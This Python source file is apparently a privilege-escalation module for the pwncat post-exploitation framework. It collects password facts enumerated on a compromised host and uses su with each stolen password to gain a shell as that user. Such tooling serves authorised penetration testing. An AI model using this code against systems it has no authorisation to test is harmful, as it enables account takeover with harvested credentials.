#!/usr/bin/env python3
from typing import List

from pwncat import util
from pwncat.gtfobins import Capability
from pwncat.privesc import BaseMethod, PrivescError, Technique
import pwncat


class Method(BaseMethod):

    name = "enumerated-passwords"
    BINARIES = ["su"]

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """
        Enumerate capabilities for this method.

        :param capability: the requested capabilities
        :return: a list of techniques implemented by this method
        """

        # We only provide shell capability
        if Capability.SHELL not in capability:
            return []

        techniques = []
        for fact in pwncat.victim.enumerate.iter(typ="system.user.password"):
            util.progress(f"enumerating password facts: {str(fact.data)}")
            techniques.append(
                Technique(fact.data.user.name, self, fact.data, Capability.SHELL)
            )
        util.erase_progress()

        return techniques

    def execute(self, technique: Technique) -> bytes:
        """
        Escalate to the new user and return a string used to exit the shell

        :param technique: the technique to user (generated by enumerate)
        :return: an exit command
        """

        # Escalate
        try:
            pwncat.victim.su(technique.user, technique.ident.password)
        except PermissionError as exc:
            raise PrivescError(str(exc))

        return "exit\n"